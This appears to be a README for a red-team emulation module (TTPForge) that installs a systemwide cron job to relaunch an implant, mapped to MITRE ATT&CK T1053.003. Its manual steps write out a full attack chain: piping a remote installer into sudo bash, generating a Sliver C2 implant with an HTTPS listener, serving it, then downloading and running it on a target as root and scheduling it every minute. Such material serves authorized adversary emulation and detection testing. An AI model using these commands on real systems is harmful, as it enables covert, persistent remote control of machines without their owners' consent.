# Systemwide Cronjob

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP enables the addition of a systemwide cronjob to run a specified implant.

## Arguments

- **implant_name**: The name of the implant to run via the cronjob. Default is "/bin/ls".

## Prerequisites

1. The executor must have root access to the system.

## Examples

You can run the TTP using the following example (after updating the arguments):
```bash
ttpforge run forgearmory//persistence/linux/systemwide-cronjob/systemwide-cronjob.yaml \
  --arg implant_name=myimplant
```

## Steps

1. **setup**: This step checks if the crontab command is installed on the current system. If not, the TTP will exit with an error message.
2. **create-crontab-entry**: This step creates a new crontab entry to run the specified implant at a set interval.
3. **check-success**: This step checks if the crontab entry for the specified implant has been successfully created. If so, the TTP will exit with a success message. Otherwise, it will exit with a failure message.

## Manual Reproduction Steps

```
### Attacker Configuration
# Escalate privileges to root
sudo su

# Download and install Sliver
curl https://sliver.sh/install | sudo bash

# Create implants folder
mkdir implants

# Get public IP
# Note value for implant creation
curl icanhazip.com

# Run Sliver
sliver

# Generate implant
generate --http PUBLIC_IP_FROM_PREVIOUS_STEPS --save implants --skip-symbols --os linux

# Start listener
https -l 443

# Background the listener or open another tab
# and host the implant for download
pushd implants ; timeout 30 python3 -m http.server 8080 ; popd

### Target Configuration

# Escalate privileges to root
sudo su

# Download and execute c2 payload
wget "http://${PUB_IP_FROM_PREV_STEP}:8080/${IMPLANT_NAME}"
chmod +x "${IMPLANT_NAME}" &
./"${IMPLANT_NAME}"

echo "* * * * * cd ${HOME} && ./${IMPLANT_NAME}" > crontab_new
sudo crontab crontab_new
sudo crontab -l

# Clean up
echo '' > crontab_new
sudo crontab crontab_new
rm crontab_new
rm "${IMPLANT_NAME}"
```

## MITRE ATT&CK Mapping

- **Tactics**:
   - TA0003 Persistence
- **Techniques**:
   - T1053 Scheduled Task/Job
- **Subtechniques**:
   - T1053.003 Scheduled Task/Job Cron
